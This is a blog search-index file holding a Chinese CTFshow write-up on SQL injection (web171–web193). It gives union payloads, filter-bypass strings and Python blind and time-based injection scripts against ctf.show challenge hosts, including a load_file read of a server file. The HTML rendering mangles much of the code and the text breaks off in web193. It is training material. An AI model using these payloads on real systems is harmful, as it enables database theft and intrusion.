<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CTF_show_Web入门_sql注入</title>
    <link href="/2022/07/21/CTF_show_Web%E5%85%A5%E9%97%A8_sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/07/21/CTF_show_Web%E5%85%A5%E9%97%A8_sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr><h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><ul><li><pre><code class="hljs">//查表名1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ //查列名1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_user&#39; --+ //查flag1&#39; union select id,username,password from ctfshow_user --+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs q"><br>### web172<br><br>- ```<br>  <span class="hljs-comment">//查数据库库名</span><br>  <span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()--+<br>  结果为ctfshow_web<br>  <br>  <span class="hljs-comment">//查数据库表名</span><br>  <span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=&#x27;ctfshow_web&#x27;--+<br>  结果ctfshow_user,ctfshow_user2<br>  <br>  <span class="hljs-comment">//查询列名</span><br>  <span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-built_in">where</span> table_name=&#x27;ctfshow_user2&#x27;--+<br></code></pre></td></tr></table></figure></code></pre></li><li><p>发现返回逻辑屏蔽了flag</p></li><li><p>使用hex绕过</p></li><li><p>&#96;&#96;&#96;<br>1’ union select to_base64(username),hex(password) from ctfshow_user2 –+</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br>- 再解码<br><br><span class="hljs-comment">### web173</span><br><br>- 类似web172<br><br>- ```<br>  <span class="hljs-number">1</span>&#x27; union select <span class="hljs-built_in">id</span>,hex(username),hex(password) <span class="hljs-keyword">from</span> ctfshow_user3<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><ul><li><p>看了WP发现这题的关键网址</p></li><li><p><a href="http://af1114ed-10d8-46ab-b33d-2232725c09cf.challenge.ctf.show/api/v4.php?id=1">http://af1114ed-10d8-46ab-b33d-2232725c09cf.challenge.ctf.show/api/v4.php?id=1</a></p></li><li><p>盲注</p></li><li><p>为了不被鄙视（用sqlmap），决定琢磨一下脚本</p></li><li><p>&#96;&#96;&#96;python<br>import requests</p><p>url &#x3D; “<a href="http://af1114ed-10d8-46ab-b33d-2232725c09cf.challenge.ctf.show/api/v4.php?id=1&#39;">http://af1114ed-10d8-46ab-b33d-2232725c09cf.challenge.ctf.show/api/v4.php?id=1&#39;</a> and “<br>result &#x3D; ‘’<br>i &#x3D; 0</p><p>while True:<br>i &#x3D; i + 1<br>head &#x3D; 32<br>tail &#x3D; 127<br><br>while head &lt; tail:<br>    mid &#x3D; (head + tail) &gt;&gt; 1<br>    payload &#x3D; f’1&#x3D;if(ascii(substr((select  password from ctfshow_user4 limit 24,1),{i},1))&gt;{mid},1,0) – -‘<br>    r &#x3D; requests.get(url + payload)<br>    if “admin” in r.text:<br>        head &#x3D; mid + 1<br>    else:<br>        tail &#x3D; mid<br><br>if head !&#x3D; 32:<br>    result +&#x3D; chr(head)<br>else:<br>    break<br>print(result)</p></li></ul><h1 id="解释一下payload"><a href="#解释一下payload" class="headerlink" title="解释一下payload"></a>解释一下payload</h1><h1 id="substr-str-i-i-的意思是从str字符中的第-i-个位置开始返回一个字符"><a href="#substr-str-i-i-的意思是从str字符中的第-i-个位置开始返回一个字符" class="headerlink" title="substr(str,{i},i)的意思是从str字符中的第{i}个位置开始返回一个字符"></a>substr(str,{i},i)的意思是从str字符中的第{i}个位置开始返回一个字符</h1><h1 id="ascii-是将一个字符转化为ASCII值"><a href="#ascii-是将一个字符转化为ASCII值" class="headerlink" title="ascii()是将一个字符转化为ASCII值"></a>ascii()是将一个字符转化为ASCII值</h1><h1 id="if-ascii-substr-…-gt-mid-1-0-语句进行判断，如果返回这个字符的ASCII值大于-mid-则返回1，否则返回0。然后结合前面的f’1-x3D-…-，返回1的话，1-x3D-1成立；返回1-x3D-0的话不成立，从而达到二分法缩小范围的目的。"><a href="#if-ascii-substr-…-gt-mid-1-0-语句进行判断，如果返回这个字符的ASCII值大于-mid-则返回1，否则返回0。然后结合前面的f’1-x3D-…-，返回1的话，1-x3D-1成立；返回1-x3D-0的话不成立，从而达到二分法缩小范围的目的。" class="headerlink" title="if(ascii(substr(….))&gt;{mid},1,0)语句进行判断，如果返回这个字符的ASCII值大于{mid}则返回1，否则返回0。然后结合前面的f’1&#x3D;…..，返回1的话，1&#x3D;1成立；返回1&#x3D;0的话不成立，从而达到二分法缩小范围的目的。"></a>if(ascii(substr(….))&gt;{mid},1,0)语句进行判断，如果返回这个字符的ASCII值大于{mid}则返回1，否则返回0。然后结合前面的f’1&#x3D;…..，返回1的话，1&#x3D;1成立；返回1&#x3D;0的话不成立，从而达到二分法缩小范围的目的。</h1>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">### web175</span><br><br>- 时间盲注：适用于页面不会返回错误信息，只会回显一种界面，其主要特征是利用<span class="hljs-built_in">sleep</span>函数，制造时间延迟，由回显时间来判断是否报错。<br><br>- ```python<br>  <span class="hljs-comment"># @Author:Y4tacker</span><br>  import requests<br>  <br>  url = <span class="hljs-string">&quot;http://cf28b506-9689-4c18-b1ae-b94d612d996c.challenge.ctf.show/api/v5.php?id=1&#x27; and &quot;</span><br>  <br>  result = <span class="hljs-string">&#x27;&#x27;</span><br>  i = 0<br>  <br>  <span class="hljs-keyword">while</span> True:<br>      i = i + 1<br>      <span class="hljs-built_in">head</span> = 32<br>      <span class="hljs-built_in">tail</span> = 127<br>  <br>      <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>          mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>          payload = f<span class="hljs-string">&#x27;1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0) -- -&#x27;</span><br>          try:<br>              r = requests.get(url + payload, <span class="hljs-built_in">timeout</span>=0.5)<br>              <span class="hljs-built_in">tail</span> = mid<br>          except Exception as e:<br>              <span class="hljs-built_in">head</span> = mid + 1<br>  <br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>          result += chr(<span class="hljs-built_in">head</span>)<br>      <span class="hljs-keyword">else</span>:<br>          <span class="hljs-built_in">break</span><br>      <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h3 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h3><ul><li><p>大小写绕过</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27; uNion <span class="hljs-keyword">sElect</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user --+<br></code></pre></td></tr></table></figure></li></ul><h3 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h3><ul><li><p>&#x2F;**&#x2F;绕过空格</p></li><li><p>%23就是#</p></li><li><p>&#96;&#96;&#96;<br>1’&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;password,1,1&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;ctfshow_user&#x2F;</strong>&#x2F;where&#x2F;<strong>&#x2F;username&#x2F;</strong>&#x2F;&#x3D;’flag’%23</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>### web<span class="hljs-number">178</span><br><br>- 过滤了空格与*号等用`<span class="hljs-variable">%09</span>`绕过<br><br>- ```<br>  <span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%09</span>union<span class="hljs-variable">%09</span><span class="hljs-keyword">select</span><span class="hljs-variable">%091</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>password<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>ctfshow_user<span class="hljs-variable">%23</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><ul><li>&#96;&#96;&#96;<br>1’or’1’&#x3D;’1’%23 #一句话，其实前面也可以<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>- ```<br>  <span class="hljs-number">1</span>&#x27;union<span class="hljs-variable">%0</span>cselect<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>password<span class="hljs-variable">%0</span>cfrom<span class="hljs-variable">%0</span>cctfshow_user<span class="hljs-variable">%23</span> #过滤了<span class="hljs-variable">%09</span>那就<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web180-182"><a href="#web180-182" class="headerlink" title="web180~182"></a>web180~182</h3><ul><li>&#96;&#96;&#96;<br>-1’or(id&#x3D;26)and’1’&#x3D;’1<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment">### web183</span><br><br>- 首先看提示需要post传参`tableName=ctfshow_user`发现有回显<br>  跑脚本<br><br>- ```pyhon<br>  import requests<br>  <br>  url = <span class="hljs-string">&quot;http://cc9ac480-5917-4e26-8d69-78f43bc6ffa3.challenge.ctf.show/select-waf.php&quot;</span><br>  str = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span><br>  flag = <span class="hljs-string">&quot;ctfshow&#123;&quot;</span><br>   <br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">40</span>):<br>      <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span>:<br>          data=&#123;<br>              <span class="hljs-string">&#x27;tableName&#x27;</span>:<span class="hljs-string">&quot;(ctfshow_user)where(pass)like&#x27;&#123;&#125;%&#x27;&quot;</span>.format(flag+j)<br>          &#125;<br>          result = requests.post(url,data)<br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;user_count = 1&#x27;</span> <span class="hljs-keyword">in</span> result.text:<br>              flag += j<br>              print(flag)<br>              <span class="hljs-keyword">if</span> j == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>                  <span class="hljs-keyword">exit</span>()<br>              <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h3><ul><li><p>其中 where 被过滤了，需要使用连接查询</p></li><li><p>&#96;&#96;&#96;python<br>import requests<br>import sys</p><p>url &#x3D; “<a href="http://9adb647c-75c6-410d-a688-cf6d91a3259e.challenge.ctf.show:8080/select-waf.php&quot;">http://9adb647c-75c6-410d-a688-cf6d91a3259e.challenge.ctf.show:8080/select-waf.php&quot;</a></p><p>flag &#x3D; “ctfshow{“</p><p>str &#x3D; “0123456789-abcdefghijklmnopqrstuvwxyz{}”</p><p>def str_to_hex(s):<br>return ‘’.join([hex(ord(c)).replace(“0x”,’’)for c in s])<br>payload &#x3D; “ctfshow_user as a right join ctfshow_user as b on b.pass like {}”</p><p>for i in range(0,100):<br>for j in str:<br>    data &#x3D; {<br>        “tableName” : payload.format(“0x”+str_to_hex(flag+j+’%’))<br>        # ‘tableName’: “ctfshow_user a inner join ctfshow_user b on b.pass like {}”.format(“0x” + str_to_hex(flag + j + “%”))<br>    }<br>    # print(data)<br>    result &#x3D; requests.post(url&#x3D;url,data&#x3D;data)<br>    if ‘$user_count &#x3D; 43’ in result.text:<br>        flag +&#x3D; j<br>        print(flag)<br>        if j &#x3D;&#x3D; ‘}’:<br>            sys.exit()</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br>### web185~<span class="hljs-number">186</span><br><br>- 过滤了数字<br>- 详细看脚本<br><br>- ```python<br>  <span class="hljs-keyword">import</span> requests<br>  <br>  url = <span class="hljs-string">&quot;http://4a5cc3ec-ec48-4ed3-b0c3-0a96305c06d2.challenge.ctf.show/select-waf.php&quot;</span><br>  <br>  flag = <span class="hljs-string">&#x27;ctfsho&#x27;</span><br>  <br>  <br>  <span class="hljs-keyword">def</span> createNum(n):#构造数字函数，原理就是是<span class="hljs-keyword">true</span>的值是<span class="hljs-number">1</span>，累加<span class="hljs-keyword">true</span>构造数值<br>      num = <span class="hljs-string">&#x27;true&#x27;</span><br>      <span class="hljs-keyword">if</span> n == <span class="hljs-number">1</span>:<br>          <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;true&#x27;</span><br>      <span class="hljs-keyword">else</span>:<br>          <span class="hljs-keyword">for</span> i in range(n - <span class="hljs-number">1</span>):<br>              num += <span class="hljs-string">&quot;+true&quot;</span><br>      <span class="hljs-keyword">return</span> num<br>  <br>  <br>  <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">45</span>):<br>      <span class="hljs-keyword">if</span> i &lt;= <span class="hljs-number">5</span>:<br>          <span class="hljs-keyword">continue</span><br>      <span class="hljs-keyword">for</span> j in range(<span class="hljs-number">127</span>):<br>          data = &#123;<br>              <span class="hljs-string">&quot;tableName&quot;</span>: f<span class="hljs-string">&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;createNum(i)&#125;,&#123;createNum(1)&#125;)regexp(char(&#123;createNum(j)&#125;)))&quot;</span><br>          &#125; <br>          #解释一下<span class="hljs-keyword">char</span>(&#123;createNum(j)&#125;))：<span class="hljs-keyword">char</span>(<span class="hljs-number">120</span>)=x, 所以<span class="hljs-keyword">char</span>(<span class="hljs-keyword">true</span>+<span class="hljs-keyword">true</span>+…<span class="hljs-number">120</span>个…+<span class="hljs-keyword">true</span>)=x；<span class="hljs-keyword">char</span>(<span class="hljs-number">50</span>)=<span class="hljs-number">2</span>, 所以<span class="hljs-keyword">char</span>(<span class="hljs-keyword">true</span>+…<span class="hljs-number">50</span>个…+<span class="hljs-keyword">true</span>)=<span class="hljs-number">2</span>;<br>          r = requests.post(url, data=data)<br>          <span class="hljs-keyword">if</span> r.text.<span class="hljs-keyword">find</span>(<span class="hljs-string">&quot;$user_count = 43;&quot;</span>) &gt; <span class="hljs-number">0</span>:<br>              <span class="hljs-keyword">if</span> chr(j) != <span class="hljs-string">&quot;.&quot;</span>:<br>                  flag += chr(j)<br>  <br>                  <span class="hljs-keyword">print</span>(flag.lower())<br>                  <span class="hljs-keyword">if</span> chr(j) == <span class="hljs-string">&quot;&#125;&quot;</span>:<br>                      exit(<span class="hljs-number">0</span>)<br>                  <span class="hljs-keyword">break</span><br>  <br>  <br></code></pre></td></tr></table></figure></li></ul><h3 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h3><ul><li><p><code>md5(string,raw)</code>其中raw参数可选，且有两种选择</p><ul><li>FALSE：32位16进制的字符串</li><li>TRUE：16位原始二进制格式的字符串</li></ul></li><li><p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password&#x3D;‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password&#x3D;‘xxx’ or 1 ，也就相当于password&#x3D;‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password&#x3D;‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</p></li><li><p>&#96;&#96;&#96;python<br>import requests</p><p>url2 &#x3D; ‘ <a href="http://c523bc8a-a1eb-4c7b-81c2-915c52efa9bb.challenge.ctf.show:8080/api/&#39;">http://c523bc8a-a1eb-4c7b-81c2-915c52efa9bb.challenge.ctf.show:8080/api/&#39;</a></p><p>payload &#x3D; {<br>“username”:”admin”,<br>“password”:”ffifdyop”<br>}</p><p>res &#x3D; requests.post(url&#x3D;url2,data&#x3D;payload).text</p><p>print(res)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>### web188<br><br>- Mysql弱比较<br><br>- 你可以尝试一下在数据库中使用这样的语句：<br>  <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> stu <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=<span class="hljs-number">0</span>很有可能是能查询出东西的，即使你没有<span class="hljs-type">name</span>为<span class="hljs-number">0</span>的数据<br><br>  这是因为数据库进行了弱比较，它<span class="hljs-keyword">select</span>出所有<span class="hljs-type">name</span>是以字母为开头的数据<br>  以字母为开头的字符型数据在与数字型比较时，会强制转化为<span class="hljs-number">0</span>，再与数字比较（这里很类似于PHP的弱比较）<br>  假设我们username为<span class="hljs-number">0</span>，那么就会相等，从而匹配成功<br><br>  在这里的<span class="hljs-keyword">password</span>是用<span class="hljs-number">0</span>来混字母开头的$<span class="hljs-keyword">row</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]<br><br>- ```python<br>  <span class="hljs-keyword">import</span> requests<br>  <br>  url = <span class="hljs-string">&#x27;http://389becec-663f-4c9e-b136-296f96d0f800.challenge.ctf.show/api/&#x27;</span><br>  <br>  payload = &#123;<br>      &quot;username&quot;:&quot;0&quot;,<br>      &quot;password&quot;:&quot;0&quot;<br>  &#125;<br>  <br>  res = requests.post(url=url,data=payload).text<br>  <br>  print(res)<br></code></pre></td></tr></table></figure></li></ul><h3 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h3><ul><li><p>提示说flag在api&#x2F;index.php文件中</p></li><li><p>先使用上题的0做弱比较，返回密码错误</p></li><li><p>如果是username是1的话，返回查询失败</p></li><li><p>所以是一道盲注</p></li><li><p>&#96;&#96;&#96;python<br>import requests<br>import sys<br>import json</p><p>url &#x3D; ‘<a href="http://72cbb7d0-93df-430b-b27f-410bc881ed88.challenge.ctf.show/api/index.php&#39;">http://72cbb7d0-93df-430b-b27f-410bc881ed88.challenge.ctf.show/api/index.php&#39;</a><br>flag &#x3D; ‘ctfshow{‘<br>letter &#x3D; ‘0123456789abcdefghijklmnopqrstuvwxyz-{}’</p><p>for i in range(100):<br>for j in letter:<br>    payload &#x3D; {<br>        “username”: “if(load_file(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php’)regexp(‘{}’),0,1)”.format(flag + j),<br>        “password”: “0”<br><br>    }<br>    r &#x3D; requests.post(url&#x3D;url,data&#x3D;payload)<br>    #print(r)<br>    if “\u5bc6\u7801\u9519\u8bef” &#x3D;&#x3D; r.json()[‘msg’]:<br>        flag +&#x3D; j<br>        print(flag)<br>        break<br>    if ‘}’ in flag:<br>        sys.exit()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">### web190</span><br><br>- ```python<br>  import requests<br>  <br>  url = <span class="hljs-string">&#x27;http://a5078e0a-b91b-4b66-b17d-e4ca982ee54e.challenge.ctf.show/api/&#x27;</span><br>  flag = <span class="hljs-string">&quot;&quot;</span><br>  i = 0<br>  <br>  <span class="hljs-keyword">while</span> True:<br>      i = i + 1<br>      <span class="hljs-built_in">head</span> = 32<br>      <span class="hljs-built_in">tail</span> = 127<br>  <br>      <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>          mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>          <span class="hljs-comment"># 查数据库</span><br>          <span class="hljs-comment"># payload = &quot;database()&quot;</span><br>          <span class="hljs-comment"># 查表</span><br>          <span class="hljs-comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>          <span class="hljs-comment"># 查字段</span><br>          <span class="hljs-comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span><br>          <span class="hljs-comment"># 查flag</span><br>          payload = <span class="hljs-string">&quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span><br>          data = &#123;<br>              <span class="hljs-string">&#x27;username&#x27;</span>: f<span class="hljs-string">&quot;admin&#x27; and if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)=&#x27;1&quot;</span>,<br>              <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span><br>          &#125;<br>  <br>          r = requests.post(url=url,data=data)<br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;\u5bc6\u7801\u9519\u8bef&quot;</span>  == r.json()[<span class="hljs-string">&#x27;msg&#x27;</span>]:<br>              <span class="hljs-built_in">head</span> = mid + 1<br>          <span class="hljs-keyword">else</span>:<br>              <span class="hljs-built_in">tail</span> = mid<br>  <br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>          flag += chr(<span class="hljs-built_in">head</span>)<br>      <span class="hljs-keyword">else</span>:<br>          <span class="hljs-built_in">break</span><br>      <span class="hljs-built_in">print</span>(flag)<br>  <br></code></pre></td></tr></table></figure></li></ul><h3 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h3><ul><li>过滤了ascii</li><li>把190的脚本中的ascii换成ord</li><li>ord函数是返回字符串第一个字符的ascii值</li></ul><h3 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h3><ul><li><p>在上一题的基础上又屏蔽了ord</p></li><li><p>把flagstr上套ascii</p></li><li><p>&#96;&#96;&#96;python<br>import requests<br>import string</p><p>url &#x3D; “<a href="http://080d608d-53e2-4243-ac9a-2879a3991bbb.challenge.ctf.show/api/&quot;">http://080d608d-53e2-4243-ac9a-2879a3991bbb.challenge.ctf.show/api/&quot;</a><br>flagstr&#x3D;” _{}-“ + string.ascii_lowercase + string.digits<br>flag &#x3D; ‘’<br>for i in range(1,45):<br>for j in flagstr:<br>    payload &#x3D; f”admin’ and if(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1)regexp(‘{j}’),1,2)&#x3D;’1”<br>    data &#x3D; {<br>        ‘username’: payload,<br>        ‘password’: ‘1’<br>    }<br>    r &#x3D; requests.post(url, data&#x3D;data)<br>    if “密码错误” &#x3D;&#x3D; r.json()[‘msg’]:<br>        flag +&#x3D; j<br>        print(flag)<br>        if “}” &#x3D;&#x3D; j:<br>            exit(0)<br>        break</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment">### web193</span><br><br>- 禁用了substr<br><br>- ```python<br>  import requests<br>  import sys<br>  url = <span class="hljs-string">&#x27;http://955bf0a2-3516-4e57-9534-f5029f4ada04.challenge.ctf.show:8080/api/&#x27;</span><br>  flag = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br>  letter = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_,&#123;&#125;&#x27;</span><br>  <br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):<br>      <span class="hljs-keyword">for</span> j <span 